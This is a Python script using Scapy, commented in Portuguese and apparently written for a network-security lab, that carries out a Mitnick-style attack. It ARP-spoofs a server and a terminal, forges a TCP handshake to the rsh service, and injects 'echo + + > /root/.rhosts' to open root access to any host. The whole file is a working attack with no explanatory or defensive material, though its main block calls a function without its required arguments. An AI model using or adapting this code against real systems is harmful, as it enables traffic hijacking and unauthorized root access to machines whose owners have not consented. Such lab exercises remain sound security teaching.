import scapy.all as scapy

# faz o arp spoof dizendo que o ip_fingido está relacionado ao end_mac para a maquina ip_enganado
def arp_spoof(end_mac, ip_fingido, ip_enganado, interface):
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #modo de transmissão é broadcast
    arp = scapy.ARP(op = 1, pdst=ip_enganado, psrc=ip_fingido, hwdst= end_mac)
    pacote= broadcast/arp
    scapy.sendp(pacote, iface= interface, verbose= 0)

#chamamos o arp_spoof para dos determinados casos: 
# x_terminal acreditar que o atacante é o serv
# server acreditar que x_terminal está em um ip inexistente
def arp_spoofing(interface, mac_local):
    serv_ip = "10.9.0.6"
    x_term_ip = "10.9.0.5"
    while True:
        arp_spoof(mac_local, serv_ip, x_term_ip, interface)
        #usa a tabela criada na main
        arp_spoof("00:00:00:00:00:00", x_term_ip, serv_ip, interface)

#Faz conexão TCP e manda uma requisição RSH com o comando echo + +
#Colocando + + no arquivo rhosts, qualquer máquina pode acessar o xterminal
def invade(interface):
    IP = scapy.IP(dst='10.9.0.5', src='10.9.0.6')
    sequencia = 1400
    sport = 1023 #sport padrao do RFC
    dport = 514  #dport padrao do RFC

    #Faz a conexão TCP (envia SYN, recebe SYN-ACL, envia ACK)
    #SYN
    TCP = scapy.TCP(sport=sport, dport=dport, flags='S', seq=sequencia)
    syn_pacote = IP/TCP
    resposta_syn = scapy.sr1(syn_pacote, iface=interface, verbose=0)
    #ACK
    TCP = scapy.TCP(sport=sport, dport=dport, flags='A', seq=sequencia+1, ack = resposta_syn.seq + 1)
    pacote_ack = IP/TCP
    scapy.send(pacote_ack, verbose=0)

    #Faz a conexão do RSH (manda ACK e SYN ACK)
    #ACK do RSH junto com o comando
    porta = '3333'
    caminho = '\x00root\x00root\x00' #comunicacao root a root
    comando = 'echo + + > /root/.rhosts' #comando echo
    flag_comando = '\x00'
    instrucao = porta + caminho + comando + flag_comando
    pacote_instrucao = scapy.Raw(load=instrucao)
    TCP = scapy.TCP(sport = sport, dport = dport, flags = 'A', seq = sequencia +1, ack = resposta_syn.seq +1)
    pacote_rsh = IP/TCP/pacote_instrucao
    scapy.send(pacote_rsh, verbose=0)

    #sniff do X terminal
    resposta_sniff = scapy.sniff(count=1, iface=interface, filter="tcp and src host 10.9.0.5")

    #SYN-ACK
    TCP = scapy.TCP(sport=3333, dport=sport, flags='SA', seq= 3030, ack=resposta_sniff[0].seq + 1)
    pacote_syn_ack = IP/TCP
    scapy.send(pacote_syn_ack, verbose=0)

if __name__ == "__main__":
    arp_spoofing()


